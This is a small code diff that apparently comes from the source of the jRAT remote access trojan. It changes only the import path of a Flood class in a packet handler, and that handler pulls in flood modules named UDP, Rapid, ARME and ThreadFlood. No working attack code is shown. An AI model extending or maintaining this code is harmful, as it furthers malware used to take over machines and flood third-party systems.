@@ -1,5 +1,6 @@
 package pro.jrat.stub.packets.incoming;
 
+import pro.jrat.common.Flood;
 import pro.jrat.stub.Connection;
 import pro.jrat.stub.Constants;
 import pro.jrat.stub.flood.ARME;
@@ -9,7 +10,6 @@ import pro.jrat.stub.flood.Rapid;
 import pro.jrat.stub.flood.ThreadFlood;
 import pro.jrat.stub.flood.UDP;
 
-import com.redpois0n.common.Flood;
 
 public class Packet22Flood extends AbstractIncomingPacket {
 	
